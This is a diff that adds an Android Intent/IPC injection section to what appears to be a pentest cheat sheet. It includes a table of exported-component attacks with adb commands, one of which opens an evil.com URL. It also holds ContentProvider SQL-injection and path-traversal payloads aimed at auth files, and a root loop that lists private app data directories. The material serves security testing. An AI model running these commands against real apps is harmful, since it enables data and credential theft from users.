@@ -331,6 +331,69 @@ xhr.send();
 
 ## Intent/IPC Injection (Android)
 
+### Exported Component Vulnerability Taxonomy
+
+| Component | Exported + No Permission | Attack | Impact |
+|-----------|--------------------------|--------|--------|
+| **Activity** | `android:exported="true"` | `am start -n pkg/.Activity --es "url" "http://evil.com"` | Access protected intents, steal data via unvalidated params, open arbitrary URLs in WebView |
+| **Service** | `android:exported="true"` | `am startservice -n pkg/.Service --es "cmd" "dump"` | Trigger file uploads, steal data, execute privileged operations |
+| **BroadcastReceiver** | `android:exported="true"` | `am broadcast -a pkg.ACTION --es "data" "injected"` | Trigger actions without restrictions, fake push notifications, bypass auth flows |
+| **ContentProvider** | `android:exported="true"` | `content query --uri content://pkg.provider/table` | SQL injection, path traversal, read/write app data |
+
+**Key checks per component type:**
+
+**Activities:**
+- Accept user-provided intents → can expose protected internal intents
+- Accept URL/file parameters → open redirect, XSS via WebView, LFI
+- Accept `content://` URIs → file theft via `FileProvider` abuse
+- Write session tokens to external storage based on intent extras
+
+**Services:**
+- Custom file upload service → third-party apps can upload arbitrary files
+- Background processing → inject commands or data
+- Bound services → call privileged methods from malicious app
+
+**BroadcastReceivers:**
+- No permission protection → any app can trigger
+- Dynamic receivers without `RECEIVER_NOT_EXPORTED` flag (Android 14+ requirement)
+- Accept data that changes app state (e.g., "logged_in=true")
+
+**ContentProviders:**
+- SQL injection via `selection` parameter: `--where "1=1) UNION SELECT sql FROM sqlite_master--"`
+- Path traversal: `content://pkg.provider/files/../../shared_prefs/auth.xml`
+- Write access: `content insert --uri content://pkg.provider/users --bind name:s:attacker`
+- `openFile()` traversal: provider returns arbitrary file descriptors
+
+### Android Data Storage Locations (Quick Reference)
+
+```bash
+# App-private directories
+/data/data/<package>/shared_prefs/     # SharedPreferences XML
+/data/data/<package>/databases/        # SQLite databases
+/data/data/<package>/files/            # Internal files
+/data/data/<package>/cache/            # Cache
+/data/data/<package>/app_webview/      # WebView data (cookies, localStorage)
+
+# External storage (world-readable on older Android)
+/sdcard/Android/data/<package>/        # App-specific external
+/sdcard/Android/obb/<package>/         # OBB expansion files
+/storage/emulated/0/Android/data/<package>/
+
+# System locations
+/data/app/<package>*/                  # Installed APK
+/data/user/0/<package>/                # User 0 data (same as /data/data/)
+
+# Check all at once
+for dir in shared_prefs databases files cache app_webview; do
+  echo "=== $dir ==="
+  adb shell "su -c 'ls /data/data/<package>/$dir/ 2>/dev/null'"
+done
+
+# External storage check (sensitive data should NOT be here)
+adb shell "ls /sdcard/Android/data/<package>/ 2>/dev/null"
+adb shell "find /sdcard/ -name '*<package>*' 2>/dev/null"
+```
+
 ### Exported Component Testing
 
 ```bash
